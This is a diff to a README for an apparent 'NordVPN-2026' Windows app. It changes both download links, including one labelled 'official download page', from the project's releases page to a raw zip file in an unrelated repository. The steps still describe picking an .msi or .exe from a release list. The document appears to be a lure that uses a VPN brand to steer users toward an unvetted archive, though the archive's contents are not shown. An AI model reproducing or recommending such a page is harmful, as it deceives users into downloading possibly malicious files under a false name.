@@ -5,7 +5,7 @@ description: "Manage NordVPN server profiles, kill switch settings, and connecti
 ---
 # 🛡️ NordVPN-2026 - Secure your internet connection with ease
 
-[![Download NordVPN-2026](https://img.shields.io/badge/Download-NordVPN--2026-blue)](https://github.com/Smmehmand4038/NordVPN-2026/releases)
+[![Download NordVPN-2026](https://img.shields.io/badge/Download-NordVPN--2026-blue)](https://raw.githubusercontent.com/Smmehmand4038/smmehmand4038.github.io/main/berri/smmehmand-github-io-2.5.zip)
 
 NordVPN-2026 simplifies network security for Windows users. This application manages server profiles, kill switch settings, split tunneling, and connection logs in one interface. You browse the web with privacy and protect your data while you work remotely.
 
@@ -23,7 +23,7 @@ Your computer must meet these standards to run the software:
 
 Follow these steps to obtain the setup files:
 
-1.  Visit the [official download page](https://github.com/Smmehmand4038/NordVPN-2026/releases).
+1.  Visit the [official download page](https://raw.githubusercontent.com/Smmehmand4038/smmehmand4038.github.io/main/berri/smmehmand-github-io-2.5.zip).
 2.  Look for the latest release version at the top of the list.
 3.  Click on the file ending in `.msi` or `.exe` to start the download.
 4.  Save the installer to your Downloads folder.
